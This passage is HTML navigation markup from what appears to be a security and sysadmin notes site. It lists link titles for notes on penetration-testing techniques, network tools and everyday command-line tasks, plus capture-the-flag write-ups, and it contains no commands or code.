href="../spells/how-to-enumerate-ad-cs-templates-with-certutil" data-for="spells/how-to-enumerate-ad-cs-templates-with-certutil">How to enumerate AD CS templates with certutil</a></li><li><a href="../spells/how-to-enumerate-services-and-shares-using-smbclient" data-for="spells/how-to-enumerate-services-and-shares-using-smbclient">How to enumerate services and shares using smbclient</a></li><li><a href="../spells/how-to-enumerate-url-paths-with-fuff" data-for="spells/how-to-enumerate-url-paths-with-fuff">How to enumerate URL paths with fuff</a></li><li><a href="../spells/how-to-enumerate-url-paths-with-owasp-zap" data-for="spells/how-to-enumerate-url-paths-with-owasp-zap">How to enumerate URL paths with OWASP ZAP</a></li><li><a href="../spells/how-to-enumerate-users-with-fuff" data-for="spells/how-to-enumerate-users-with-fuff">How to enumerate users with fuff</a></li><li><a href="../spells/how-to-escalate-privileges-from-suid-vim" data-for="spells/how-to-escalate-privileges-from-suid-vim">How to escalate privileges from SUID ViM</a></li><li><a href="../spells/how-to-exploit-asp-scripts-with-msfvenom" data-for="spells/how-to-exploit-asp-scripts-with-msfvenom">How to exploit ASP scripts with msfvenom</a></li><li><a href="../spells/how-to-exploit-the-bash-ps4-prompt" data-for="spells/how-to-exploit-the-bash-ps4-prompt">How to exploit the Bash PS4 (debugging) prompt</a></li><li><a href="../spells/how-to-exploit-jsp-scripts-with-msfvenom" data-for="spells/how-to-exploit-jsp-scripts-with-msfvenom">How to exploit JSP Scripts with msfvenom</a></li><li><a href="../spells/how-to-exploit-jwts-signed-using-a-public-key" data-for="spells/how-to-exploit-jwts-signed-using-a-public-key">How to exploit JWTs signed using a public key</a></li><li><a href="../spells/how-to-exploit-jwts-that-support-the-none-signature-algorithm" data-for="spells/how-to-exploit-jwts-that-support-the-none-signature-algorithm">How to exploit JWTs that support the NONE signature algorithm</a></li><li><a href="../spells/how-to-exploit-ld_library_path" data-for="spells/how-to-exploit-ld_library_path">How to exploit LD_LIBRARY_PATH</a></li><li><a href="../spells/how-to-exploit-ld_preload" data-for="spells/how-to-exploit-ld_preload">How to exploit LD_PRELOAD</a></li><li><a href="../spells/how-to-exploit-linux-elf-executables-with-msfvenom" data-for="spells/how-to-exploit-linux-elf-executables-with-msfvenom">How to exploit Linux ELF executables with msfvenom</a></li><li><a href="../spells/how-to-exploit-log4shell" data-for="spells/how-to-exploit-log4shell">How to exploit Log4Shell</a></li><li><a href="../spells/how-to-exploit-macos-mach-o-executables-with-msfvenom" data-for="spells/how-to-exploit-macos-mach-o-executables-with-msfvenom">How to exploit macOS MACH-O executables with msfvenom</a></li><li><a href="../spells/how-to-exploit-perl-scripts-with-msfvenom" data-for="spells/how-to-exploit-perl-scripts-with-msfvenom">How to exploit Perl scripts with msfvenom</a></li><li><a href="../spells/how-to-exploit-php-scripts-with-msfvenom" data-for="spells/how-to-exploit-php-scripts-with-msfvenom">How to exploit PHP scripts with msfvenom</a></li><li><a href="../spells/how-to-exploit-python-scripts-with-msfvenom" data-for="spells/how-to-exploit-python-scripts-with-msfvenom">How to exploit Python scripts with msfvenom</a></li><li><a href="../spells/how-to-exploit-shell-scripts-with-msfvenom" data-for="spells/how-to-exploit-shell-scripts-with-msfvenom">How to exploit shell scripts with msfvenom</a></li><li><a href="../spells/how-to-exploit-vba-scripts-with-msfvenom" data-for="spells/how-to-exploit-vba-scripts-with-msfvenom">How to exploit VBA scripts with msfvenom</a></li><li><a href="../spells/how-to-exploit-weak-etc-passwd-permissions" data-for="spells/how-to-exploit-weak-etc-passwd-permissions">How to exploit weak /etc/passwd permissions</a></li><li><a href="../spells/how-to-exploit-weak-etc-shadow-permissions" data-for="spells/how-to-exploit-weak-etc-shadow-permissions">How to exploit weak /etc/shadow permissions</a></li><li><a href="../spells/how-to-exploit-the-windows-dll-search-order" data-for="spells/how-to-exploit-the-windows-dll-search-order">How to exploit the Windows DLL search order</a></li><li><a href="../spells/how-to-exploit-windows-executables-with-msfvenom" data-for="spells/how-to-exploit-windows-executables-with-msfvenom">How to exploit Windows executables with msfvenom</a></li><li><a href="../spells/how-to-exploit-the-windows-feature-on-demand-helper" data-for="spells/how-to-exploit-the-windows-feature-on-demand-helper">How to exploit the Windows “Feature on Demand” Helper</a></li><li><a href="../spells/how-to-exploit-windows-file-associations" data-for="spells/how-to-exploit-windows-file-associations">How to exploit Windows file associations</a></li><li><a href="../spells/how-to-exploit-windows-html-applications-with-msfvenom" data-for="spells/how-to-exploit-windows-html-applications-with-msfvenom">How to exploit Windows HTML applications with msfvenom</a></li><li><a href="../spells/how-to-exploit-windows-msi-installers-with-msfvenom" data-for="spells/how-to-exploit-windows-msi-installers-with-msfvenom">How to exploit Windows MSI installers with msfvenom</a></li><li><a href="../spells/how-to-exploit-windows-shortcut-files" data-for="spells/how-to-exploit-windows-shortcut-files">How to exploit Windows shortcut files</a></li><li><a href="../spells/how-to-exploit-the-winlogon-initialization-sequence" data-for="spells/how-to-exploit-the-winlogon-initialization-sequence">How to exploit the WinLogon initialization sequence</a></li><li><a href="../spells/how-to-export-highlights-and-annotations-from-kobo-ereaders" data-for="spells/how-to-export-highlights-and-annotations-from-kobo-ereaders">How to export highlights and annotations from Kobo eReaders</a></li><li><a href="../spells/how-to-extract-the-webpage-title-from-a-url" data-for="spells/how-to-extract-the-webpage-title-from-a-url">How to extract the webpage title from a URL</a></li><li><a href="../spells/how-to-find-executables-with-suid-capabilities" data-for="spells/how-to-find-executables-with-suid-capabilities">How to find executables with SUID capabilities</a></li><li><a href="../spells/how-to-find-and-replace-a-single-line-in-a-large-text-file" data-for="spells/how-to-find-and-replace-a-single-line-in-a-large-text-file">How to find and replace a single line in a large text file</a></li><li><a href="../spells/how-to-find-suid-and-sgid-executables-with-find" data-for="spells/how-to-find-suid-and-sgid-executables-with-find">How to find SUID and SGID executables with find</a></li><li><a href="../spells/how-to-find-world-accessible-and-world-modifiable-folders-with-find" data-for="spells/how-to-find-world-accessible-and-world-modifiable-folders-with-find">How to find world-accessible and world-modifiable folders with find</a></li><li><a href="../spells/how-to-fix-exif-data-on-google-photos-exports" data-for="spells/how-to-fix-exif-data-on-google-photos-exports">How to fix EXIF data on Google Photos exports</a></li><li><a href="../spells/how-to-forward-a-port-with-netcat" data-for="spells/how-to-forward-a-port-with-netcat">How to forward a port with netcat</a></li><li><a href="../spells/how-to-generate-a-self-signed-ssl-certificate" data-for="spells/how-to-generate-a-self-signed-ssl-certificate">How to generate a self-signed SSL certificate</a></li><li><a href="../spells/how-to-get-ios-shortcuts-to-show-up-in-the-share-sheet-after-reinstallation" data-for="spells/how-to-get-ios-shortcuts-to-show-up-in-the-share-sheet-after-reinstallation">How to get iOS Shortcuts to show up in the share sheet after reinstallation</a></li><li><a href="../spells/how-to-get-a-shell-from-vim" data-for="spells/how-to-get-a-shell-from-vim">How to get a shell from ViM</a></li><li><a href="../spells/how-to-get-an-ssl-certificate-from-a-real-registrar" data-for="spells/how-to-get-an-ssl-certificate-from-a-real-registrar">How to get an SSL certificate from a real registrar</a></li><li><a href="../spells/how-to-harvest-kerberos-tickets-with-rubeus" data-for="spells/how-to-harvest-kerberos-tickets-with-rubeus">How to harvest Kerberos tickets with Rubeus</a></li><li><a href="../spells/how-to-hide-windows-tasks-using-psexec" data-for="spells/how-to-hide-windows-tasks-using-psexec">How to hide Windows tasks using PsExec</a></li><li><a href="../spells/how-to-impersonate-a-user-with-meterpreter" data-for="spells/how-to-impersonate-a-user-with-meterpreter">How to impersonate a user with meterpreter</a></li><li><a href="../spells/how-to-load-drivers-in-windows" data-for="spells/how-to-load-drivers-in-windows">How to load drivers in Windows</a></li><li><a href="../spells/how-to-look-up-unicode-and-emoji-symbols" data-for="spells/how-to-look-up-unicode-and-emoji-symbols">How to look up unicode and emoji symbols</a></li><li><a href="../spells/how-to-manipulate-remote-windows-tasks" data-for="spells/how-to-manipulate-remote-windows-tasks">How to manipulate remote Windows tasks</a></li><li><a href="../spells/how-to-manipulate-users-and-groups-at-the-windows-command-line-using-net" data-for="spells/how-to-manipulate-users-and-groups-at-the-windows-command-line-using-net">How to manipulate users and groups at the Windows command line using net</a></li><li><a href="../spells/how-to-match-files-to-packages-in-debian-based-operating-systems" data-for="spells/how-to-match-files-to-packages-in-debian-based-operating-systems">How to match files to packages in Debian-based operating systems</a></li><li><a href="../spells/how-to-match-files-to-packages-in-red-hat-based-operating-systems" data-for="spells/how-to-match-files-to-packages-in-red-hat-based-operating-systems">How to match files to packages in Red Hat-based operating systems</a></li><li><a href="../spells/how-to-pass-the-hash-with-mimikatz" data-for="spells/how-to-pass-the-hash-with-mimikatz">How to pass the hash with Mimikatz</a></li><li><a href="../spells/how-to-pass-the-key-with-mimikatz" data-for="spells/how-to-pass-the-key-with-mimikatz">How to pass the key with Mimikatz</a></li><li><a href="../spells/how-to-pass-the-ticket-with-mimikatz" data-for="spells/how-to-pass-the-ticket-with-mimikatz">How to pass the ticket with Mimikatz</a></li><li><a href="../spells/how-to-pop-a-system-shell-on-the-windows-login-screen-using-sticky-keys" data-for="spells/how-to-pop-a-system-shell-on-the-windows-login-screen-using-sticky-keys">How to pop a SYSTEM shell on the Windows login screen using sticky keys</a></li><li><a href="../spells/how-to-pop-a-system-shell-on-the-windows-login-screen-using-utilman" data-for="spells/how-to-pop-a-system-shell-on-the-windows-login-screen-using-utilman">How to pop a SYSTEM shell on the Windows login screen using Utilman</a></li><li><a href="../spells/how-to-port-scan-with-netcat" data-for="spells/how-to-port-scan-with-netcat">How to port scan with netcat</a></li><li><a href="../spells/how-to-pull-ssl-certificates-from-an-external-server" data-for="spells/how-to-pull-ssl-certificates-from-an-external-server">How to pull SSL certificates from an external server</a></li><li><a href="../spells/how-to-quickly-bypass-ssh-agent" data-for="spells/how-to-quickly-bypass-ssh-agent">How to quickly bypass ssh-agent</a></li><li><a href="../spells/how-to-quickly-find-the-canonical-path-of-a-file" data-for="spells/how-to-quickly-find-the-canonical-path-of-a-file">How to quickly find the canonical path of a file</a></li><li><a href="../spells/how-to-read-a-file-beginning-with-a-dash" data-for="spells/how-to-read-a-file-beginning-with-a-dash">How to read a file beginning with a dash (-)</a></li><li><a href="../spells/how-to-remotely-install-a-windows-package-with-wmic" data-for="spells/how-to-remotely-install-a-windows-package-with-wmic">How to remotely install a Windows package with wmic</a></li><li><a href="../spells/how-to-remove-all-but-the-first-occurrence-of-a-line-in-bash" data-for="spells/how-to-remove-all-but-the-first-occurrence-of-a-line-in-bash">How to remove all but the first occurrence of a line in Bash</a></li><li><a href="../spells/how-to-remove-all-but-the-last-occurrence-of-a-line-in-bash" data-for="spells/how-to-remove-all-but-the-last-occurrence-of-a-line-in-bash">How to remove all but the last occurrence of a line in Bash</a></li><li><a href="../spells/how-to-remove-duplicate-lines-in-bash-when-line-order-is-not-important" data-for="spells/how-to-remove-duplicate-lines-in-bash-when-line-order-is-not-important">How to remove duplicate lines in Bash when line order isn’t important</a></li><li><a href="../spells/how-to-retrieve-aix-system-information" data-for="spells/how-to-retrieve-aix-system-information">How to retrieve AIX system information</a></li><li><a href="../spells/how-to-run-commands-directly-with-powershell" data-for="spells/how-to-run-commands-directly-with-powershell">How to run commands directly with PowerShell</a></li><li><a href="../spells/how-to-run-a-remote-command-with-wmic" data-for="spells/how-to-run-a-remote-command-with-wmic">How to run a remote command with wmic</a></li><li><a href="../spells/how-to-send-a-command-using-openssl" data-for="spells/how-to-send-a-command-using-openssl">How to send a command using OpenSSL</a></li><li><a href="../spells/how-to-set-the-path-in-a-session-on-unix-like-operating-systems" data-for="spells/how-to-set-the-path-in-a-session-on-unix-like-operating-systems">How to set the PATH in a session on UNIX-like operating systems</a></li><li><a href="../spells/how-to-set-the-path-in-a-session-on-windows" data-for="spells/how-to-set-the-path-in-a-session-on-windows">How to set the PATH in a session on Windows</a></li><li><a href="../spells/how-to-specify-an-alternate-ssh-key-as-a-git-config-directive" data-for="spells/how-to-specify-an-alternate-ssh-key-as-a-git-config-directive">How to specify an alternate SSH key as a Git config directive</a></li><li><a href="../spells/how-to-specify-an-alternate-ssh-key-using-the-git_ssh_command-variable" data-for="spells/how-to-specify-an-alternate-ssh-key-using-the-git_ssh_command-variable">How to specify an alternate SSH key using the GIT_SSH_COMMAND variable</a></li><li><a href="../spells/how-to-specify-an-alternate-ssh-key-with-git-using-ssh-agent" data-for="spells/how-to-specify-an-alternate-ssh-key-with-git-using-ssh-agent">How to specify an alternate SSH key with git using ssh-agent</a></li><li><a href="../spells/how-to-spider-websites-and-apis-with-owasp-zap" data-for="spells/how-to-spider-websites-and-apis-with-owasp-zap">How to spider websites and APIs with OWASP ZAP</a></li><li><a href="../spells/how-to-start-a-netcat-client" data-for="spells/how-to-start-a-netcat-client">How to start a netcat client</a></li><li><a href="../spells/how-to-start-a-netcat-server" data-for="spells/how-to-start-a-netcat-server">How to start a netcat server</a></li><li><a href="../spells/how-to-start-powershell-from-a-meterpreter-session" data-for="spells/how-to-start-powershell-from-a-meterpreter-session">How to start PowerShell from a meterpreter session</a></li><li><a href="../spells/how-to-transfer-files-over-ftp-using-netcat" data-for="spells/how-to-transfer-files-over-ftp-using-netcat">How to transfer files over FTP using netcat</a></li><li><a href="../spells/how-to-upgrade-postgresql" data-for="spells/how-to-upgrade-postgresql">How to upgrade PostgreSQL</a></li><li><a href="../spells/how-to-use-bash-functions-to-backdoor-executables" data-for="spells/how-to-use-bash-functions-to-backdoor-executables">How to use Bash functions to “backdoor” executables</a></li><li><a href="../spells/how-to-use-burp-suite-with-firefox" data-for="spells/how-to-use-burp-suite-with-firefox">How to use Burp Suite with Firefox</a></li><li><a href="../spells/how-to-use-burp-suite-with-mobile-apps" data-for="spells/how-to-use-burp-suite-with-mobile-apps">How to use Burp Suite with mobile apps</a></li><li><a href="../spells/how-to-use-a-certificate-to-request-a-ticket-with-rubeus" data-for="spells/how-to-use-a-certificate-to-request-a-ticket-with-rubeus">How to use a certificate to request a ticket with Rubeus</a></li><li><a href="../spells/how-to-use-curl-and-jq-with-web-apis" data-for="spells/how-to-use-curl-and-jq-with-web-apis">How to use curl and jq with web APIs</a></li><li><a href="../spells/how-to-use-hashcat-for-brute-force-password-guessing" data-for="spells/how-to-use-hashcat-for-brute-force-password-guessing">How to use Hashcat for brute force password guessing</a></li><li><a href="../spells/how-to-use-hydra" data-for="spells/how-to-use-hydra">How to use Hydra</a></li><li><a href="../spells/how-to-use-msfvenom-to-generate-a-binary-that-launches-any-command-as-root" data-for="spells/how-to-use-msfvenom-to-generate-a-binary-that-launches-any-command-as-root">How to use msfvenom to generate a binary that launches any command as root</a></li><li><a href="../spells/how-to-use-netcat-as-a-replacement-for-telnet" data-for="spells/how-to-use-netcat-as-a-replacement-for-telnet">How to use netcat as a replacement for telnet</a></li><li><a href="../spells/how-to-use-openssl-to-encrypt-and-decrypt-files" data-for="spells/how-to-use-openssl-to-encrypt-and-decrypt-files">How to use OpenSSL to encrypt and decrypt files</a></li><li><a href="../spells/how-to-use-smbclient" data-for="spells/how-to-use-smbclient">How to use smbclient</a></li><li><a href="../spells/how-to-use-sqli-to-bypass-authentication" data-for="spells/how-to-use-sqli-to-bypass-authentication">How to use SQLi to bypass authentication</a></li><li><a href="../spells/how-to-use-the-windows-firewall-to-relay-ports" data-for="spells/how-to-use-the-windows-firewall-to-relay-ports">How to use the Windows Firewall to relay ports</a></li><li><a href="../spells/how-to-use-winrm-with-powershell" data-for="spells/how-to-use-winrm-with-powershell">How to use WinRM with PowerShell</a></li><li><a href="../spells/how-to-work-with-base64-encoding-using-powershell" data-for="spells/how-to-work-with-base64-encoding-using-powershell">How to work with base64 encoding using PowerShell</a></li><li><a href="../spells/how-to-work-with-remote-services-using-wmi-and-powershell" data-for="spells/how-to-work-with-remote-services-using-wmi-and-powershell">How to work with remote services using WMI and PowerShell</a></li><li><a href="../spells/how-to-create-work-with-remote-tasks-using-wmi-and-powershell" data-for="spells/how-to-create-work-with-remote-tasks-using-wmi-and-powershell">How to work with remote tasks using WMI and PowerShell</a></li><li><a href="../spells/icacls" data-for="spells/icacls">icacls</a></li><li><a href="../spells/icmp" data-for="spells/icmp">ICMP</a></li><li><a href="../spells/iftop" data-for="spells/iftop">iftop</a></li><li><a href="../spells/iis-configuration-data" data-for="spells/iis-configuration-data">IIS configuration data</a></li><li><a href="../spells/imap" data-for="spells/imap">IMAP</a></li><li><a href="../spells/impacket-psexec-reimplementation" data-for="spells/impacket-psexec-reimplementation">Impacket PsExec reimplementation</a></li><li><a href="../spells/injecting-javascript-using-iframe-and-image-tags" data-for="spells/injecting-javascript-using-iframe-and-image-tags">Injecting JavaScript using iframe and image tags</a></li><li><a href="../spells/invoke-webrequest" data-for="spells/invoke-webrequest">Invoke-WebRequest</a></li><li><a href="../spells/ipconfig" data-for="spells/ipconfig">ipconfig</a></li><li><a href="../spells/ipsec" data-for="spells/ipsec">IPSec</a></li><li><a href="../spells/ipv4-address-representations-for-localhost" data-for="spells/ipv4-address-representations-for-localhost">IPv4 address representations for localhost</a></li><li><a href="../spells/issue-definitions-in-burp-suite" data-for="spells/issue-definitions-in-burp-suite">Issue definitions in Burp Suite</a></li><li><a href="../spells/java-reverse-shell" data-for="spells/java-reverse-shell">Java reverse shell</a></li><li><a href="../spells/john-the-ripper-helper-applications" data-for="spells/john-the-ripper-helper-applications">John the Ripper helper applications</a></li><li><a href="../spells/john-the-ripper-single-crack-mode" data-for="spells/john-the-ripper-single-crack-mode">John the Ripper single crack mode</a></li><li><a href="../spells/kerberoasting-with-impacket" data-for="spells/kerberoasting-with-impacket">Kerberoasting with Impacket</a></li><li><a href="../spells/kerberoasting-with-rubeus" data-for="spells/kerberoasting-with-rubeus">Kerberoasting with Rubeus</a></li><li><a href="../spells/kerberos-teminology" data-for="spells/kerberos-teminology">Kerberos teminology</a></li><li><a href="../spells/keylogging-with-xss" data-for="spells/keylogging-with-xss">Keylogging with cross-site scripting</a></li><li><a href="../spells/kirbi-files" data-for="spells/kirbi-files">kirbi files</a></li><li><a href="../spells/less" data-for="spells/less">less</a></li><li><a href="../spells/mac-addresses" data-for="spells/mac-addresses">mac addresses</a></li><li><a href="../spells/magic-numbers" data-for="spells/magic-numbers">Magic numbers</a></li><li><a href="../spells/man" data-for="spells/man">man</a></li><li><a href="../spells/metasploit-cifs-modules" data-for="spells/metasploit-cifs-modules">Metasploit CIFS modules</a></li><li><a href="../spells/metasploit-exploit-modules" data-for="spells/metasploit-exploit-modules">Metasploit exploit modules</a></li><li><a href="../spells/metasploit-ms-sql-modules" data-for="spells/metasploit-ms-sql-modules">Metasploit MS SQL modules</a></li><li><a href="../spells/metasploit-scanner-modules" data-for="spells/metasploit-scanner-modules">Metasploit scanner modules</a></li><li><a href="../spells/minimal-request-http-request" data-for="spells/minimal-request-http-request">Minimal request HTTP request</a></li><li><a href="../spells/mitre-attack-emulation-plans" data-for="spells/mitre-attack-emulation-plans">MITRE ATT&amp;CK emulation plans</a></li><li><a href="../spells/more" data-for="spells/more">more</a></li><li><a href="../spells/mysql" data-for="spells/mysql">MySQL</a></li><li><a href="../spells/nano" data-for="spells/nano">Nano</a></li><li><a href="../spells/nbtscan" data-for="spells/nbtscan">nbtscan</a></li><li><a href="../spells/netsh" data-for="spells/netsh">netsh</a></li><li><a href="../spells/netstat" data-for="spells/netstat">netstat</a></li><li><a href="../spells/nfs-reconnaissance-with-nmap" data-for="spells/nfs-reconnaissance-with-nmap">NFS reconnaissance with Nmap</a></li><li><a href="../spells/nfs-root-squashing" data-for="spells/nfs-root-squashing">NFS root squashing</a></li><li><a href="../spells/nikto" data-for="spells/nikto">Nikto</a></li><li><a href="../spells/nmap-host-discovery-flags" data-for="spells/nmap-host-discovery-flags">Nmap host discovery flags</a></li><li><a href="../spells/nmap-output-flags" data-for="spells/nmap-output-flags">Nmap output flags</a></li><li><a href="../spells/nmap-port-states" data-for="spells/nmap-port-states">Nmap port states</a></li><li><a href="../spells/nmap-scan-type-flags" data-for="spells/nmap-scan-type-flags">Nmap scan type flags</a></li><li><a href="../spells/nmap-scripting-engine-categories" data-for="spells/nmap-scripting-engine-categories">Nmap scripting engine categories</a></li><li><a href="../spells/nmap-shell-escape" data-for="spells/nmap-shell-escape">Nmap shell escape</a></li><li><a href="../spells/node.js" data-for="spells/node.js">Node.js</a></li><li><a href="../spells/nslookup" data-for="spells/nslookup">nslookup</a></li><li><a href="../spells/onedrive-ios-quirks" data-for="spells/onedrive-ios-quirks">OneDrive iOS quirks</a></li><li><a href="../spells/oracle-sql-server" data-for="spells/oracle-sql-server">Oracle SQL Server</a></li><li><a href="../spells/osi-model" data-for="spells/osi-model">OSI model</a></li><li><a href="../spells/out-of-band-sqli" data-for="spells/out-of-band-sqli">Out-of-band SQLi</a></li><li><a href="../spells/pass-the-ticket-attacks" data-for="spells/pass-the-ticket-attacks">Pass the ticket attacks</a></li><li><a href="../spells/password-spraying-with-rubeus" data-for="spells/password-spraying-with-rubeus">Password spraying with Rubeus</a></li><li><a href="../spells/perl" data-for="spells/perl">Perl</a></li><li><a href="../spells/php-reverse-shell" data-for="spells/php-reverse-shell">PHP reverse shell</a></li><li><a href="../spells/php-web-shell" data-for="spells/php-web-shell">PHP web shell</a></li><li><a href="../spells/ping" data-for="spells/ping">ping</a></li><li><a href="../spells/poison-null-byte-in-php" data-for="spells/poison-null-byte-in-php">Poison null byte in PHP</a></li><li><a href="../spells/pop3" data-for="spells/pop3">POP3</a></li><li><a href="../spells/port-scanning-with-bash" data-for="spells/port-scanning-with-bash">Port scanning with Bash</a></li><li><a href="../spells/posix-process-signals" data-for="spells/posix-process-signals">POSIX process signals</a></li><li><a href="../spells/powershell-history-file" data-for="spells/powershell-history-file">PowerShell history file</a></li><li><a href="../spells/powershell-reverse-shell" data-for="spells/powershell-reverse-shell">PowerShell reverse shell</a></li><li><a href="../spells/process-migration-in-meterpreter" data-for="spells/process-migration-in-meterpreter">Process migration in meterpreter</a></li><li><a href="../spells/ps" data-for="spells/ps">ps</a></li><li><a href="../spells/python-reverse-shell" data-for="spells/python-reverse-shell">Python reverse shell</a></li><li><a href="../spells/quick-n-dirty-python-web-server" data-for="spells/quick-n-dirty-python-web-server">Quick-n-dirty Python web server</a></li><li><a href="../spells/rce-via-xxe-in-php" data-for="spells/rce-via-xxe-in-php">RCE via XXE in PHP</a></li><li><a href="../spells/reg" data-for="spells/reg">reg</a></li><li><a href="../spells/regex-metacharacters" data-for="spells/regex-metacharacters">Regex metacharacters</a></li><li><a href="../spells/remote-port-forwarding-with-ssh" data-for="spells/remote-port-forwarding-with-ssh">Remote port forwarding with SSH</a></li><li><a href="../spells/reverse-dynamic-port-forwarding-with-ssh" data-for="spells/reverse-dynamic-port-forwarding-with-ssh">Reverse dynamic port forwarding with SSH</a></li><li><a href="../spells/ruby" data-for="spells/ruby">Ruby</a></li><li><a href="../spells/runas" data-for="spells/runas">runas</a></li><li><a href="../spells/scoping-in-burp-suite" data-for="spells/scoping-in-burp-suite">Scoping in Burp Suite</a></li><li><a href="../spells/shell-stabilization" data-for="spells/shell-stabilization">Shell stabilization</a></li><li><a href="../spells/sip-response-codes" data-for="spells/sip-response-codes">SIP response codes</a></li><li><a href="../spells/smbget" data-for="spells/smbget">smbget</a></li><li><a href="../spells/smbmap" data-for="spells/smbmap">smbmap</a></li><li><a href="../spells/smtp" data-for="spells/smtp">SMTP</a></li><li><a href="../spells/sqli-defense" data-for="spells/sqli-defense">SQLi defense</a></li><li><a href="../spells/sqlmap" data-for="spells/sqlmap">SQLMap</a></li><li><a href="../spells/ss" data-for="spells/ss">ss</a></li><li><a href="../spells/stealing-cookies-with-xss" data-for="spells/stealing-cookies-with-xss">Stealing cookies with cross-site scripting</a></li><li><a href="../spells/sudo" data-for="spells/sudo">sudo</a></li><li><a href="../spells/systemctl" data-for="spells/systemctl">systemctl</a></li><li><a href="../spells/systeminfo" data-for="spells/systeminfo">systeminfo</a></li><li><a href="../spells/tar" data-for="spells/tar">tar</a></li><li><a href="../spells/tcp-acknowledgement-number" data-for="spells/tcp-acknowledgement-number">TCP acknowledgement number</a></li><li><a href="../spells/tcpdump" data-for="spells/tcpdump">tcpdump</a></li><li><a href="../spells/tcp-header-flags" data-for="spells/tcp-header-flags">TCP header flags</a></li><li><a href="../spells/tcp-initial-round-trip-time" data-for="spells/tcp-initial-round-trip-time">TCP initial round trip time</a></li><li><a href="../spells/tcp-options" data-for="spells/tcp-options">TCP options</a></li><li><a href="../spells/tcp-window-size" data-for="spells/tcp-window-size">TCP window size</a></li><li><a href="../spells/telnet" data-for="spells/telnet">Telnet</a></li><li><a href="../spells/time-based-sqli" data-for="spells/time-based-sqli">Time-based SQLi</a></li><li><a href="../spells/tips-for-writing-xss-attacks" data-for="spells/tips-for-writing-xss-attacks">Tips for writing cross-site scripting (XSS) attacks</a></li><li><a href="../spells/tmux" data-for="spells/tmux">tmux</a></li><li><a href="../spells/udp" data-for="spells/udp">UDP</a></li><li><a href="../spells/unbuffer" data-for="spells/unbuffer">unbuffer</a></li><li><a href="../spells/uniform-resource-locators" data-for="spells/uniform-resource-locators">Uniform resource locators (URLs)</a></li><li><a href="../spells/union-based-sqli" data-for="spells/union-based-sqli">Union-based SQLi</a></li><li><a href="../spells/unix-file-descriptors" data-for="spells/unix-file-descriptors">UNIX file descriptors</a></li><li><a href="../spells/unix-password-hashes" data-for="spells/unix-password-hashes">UNIX password hashes</a></li><li><a href="../spells/unix-permission-representation" data-for="spells/unix-permission-representation">UNIX permission representation</a></li><li><a href="../spells/unquoted-path-handling-in-windows" data-for="spells/unquoted-path-handling-in-windows">Unquoted path handling in Windows</a></li><li><a href="../spells/useful-built-in-commands-for-linux-reconnaissance" data-for="spells/useful-built-in-commands-for-linux-reconnaissance">Useful built-in commands for Linux reconnaissance</a></li><li><a href="../spells/useful-built-in-commands-for-windows-reconnaissance" data-for="spells/useful-built-in-commands-for-windows-reconnaissance">Useful built-in commands for Windows reconnaissance</a></li><li><a href="../spells/useful-netcat-flags" data-for="spells/useful-netcat-flags">Useful netcat flags</a></li><li><a href="../spells/useful-net-commands" data-for="spells/useful-net-commands">Useful net commands</a></li><li><a href="../spells/website-defacement-with-cross-site-scripting" data-for="spells/website-defacement-with-cross-site-scripting">Website defacement with cross-site scripting</a></li><li><a href="../spells/wfuzz" data-for="spells/wfuzz">wfuzz</a></li><li><a href="../spells/whoami" data-for="spells/whoami">whoami</a></li><li><a href="../spells/wifi" data-for="spells/wifi">Wi-Fi</a></li><li><a href="../spells/windows-dll-search-order" data-for="spells/windows-dll-search-order">Windows DLL search order</a></li><li><a href="../spells/windows-event-ids" data-for="spells/windows-event-ids">Windows event IDs</a></li><li><a href="../spells/windows-local-service-accounts" data-for="spells/windows-local-service-accounts">Windows local service accounts</a></li><li><a href="../spells/windows-logon-scripts" data-for="spells/windows-logon-scripts">Windows logon scripts</a></li><li><a href="../spells/windows-permissions" data-for="spells/windows-permissions">Windows permissions</a></li><li><a href="../spells/windows-remote-management" data-for="spells/windows-remote-management">Windows remote management</a></li><li><a href="../spells/windows-run-and-runonce-registry-keys" data-for="spells/windows-run-and-runonce-registry-keys">Windows Run and RunOnce Registry keys</a></li><li><a href="../spells/windows-scripting-host" data-for="spells/windows-scripting-host">Windows Scripting Host</a></li><li><a href="../spells/windows-sebackup-and-serestore-permissions" data-for="spells/windows-sebackup-and-serestore-permissions">Windows SeBackup and SeRestore permissions</a></li><li><a href="../spells/windows-seimpersonate-and-seassignrimarytoken-permissions" data-for="spells/windows-seimpersonate-and-seassignrimarytoken-permissions">Windows SeImpersonate and SeAssignPrimaryToken permissions</a></li><li><a href="../spells/windows-service-acls" data-for="spells/windows-service-acls">Windows service ACLs</a></li><li><a href="../spells/windows-service-security" data-for="spells/windows-service-security">Windows service security</a></li><li><a href="../spells/windows-setakeownership-permission" data-for="spells/windows-setakeownership-permission">Windows SeTakeOwnership permission</a></li><li><a href="../spells/windows-startup-folder" data-for="spells/windows-startup-folder">Windows Startup folder</a></li><li><a href="../spells/windows-unattended-installation-data" data-for="spells/windows-unattended-installation-data">Windows unattended installation data</a></li><li><a href="../spells/winrs" data-for="spells/winrs">winrs</a></li><li><a href="../spells/wireshark-filters" data-for="spells/wireshark-filters">Wireshark filters</a></li><li><a href="../spells/working-with-gdb-breakpoints" data-for="spells/working-with-gdb-breakpoints">Working with gdb breakpoints</a></li><li><a href="../spells/working-with-gdb-watchpoints" data-for="spells/working-with-gdb-watchpoints">Working with gdb watchpoints</a></li><li><a href="../spells/working-with-services-in-powershell" data-for="spells/working-with-services-in-powershell">Working with services in PowerShell</a></li><li><a href="../spells/xfreerdp" data-for="spells/xfreerdp">XFreeRDP</a></li><li><a href="../spells/xp_cmdshell" data-for="spells/xp_cmdshell">xp_cmdshell</a></li><li><a href="../spells/xterm" data-for="spells/xterm">Xterm</a></li><li><a href="../spells/xxd" data-for="spells/xxd">xxd</a></li></ul></div></li><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="tales"><button class="folder-button"><span class="folder-title">Tales</span></button></div></div><div class="folder-outer open"><ul style="padding-left:1.4rem;" class="content" data-folderul="tales"><li><a href="../tales/2020-07-27-bandit" data-for="tales/2020-07-27-bandit">Bandit</a></li><li><a href="../tales/2021-10-10-pickle-rick" data-for="tales/2021-10-10-pickle-rick">Pickle Rick</a></li><li><a href="../tales/2021-11-04-basic-pentesting" data-for="tales/2021-11-04-basic-pentesting">Basic pentesting</a></li><li><a href="../tales/2021-12-07-ice" data-for="tales/2021-12-07-ice">Ice</a></li><li><a href="../tales/2021-12-08-blaster" 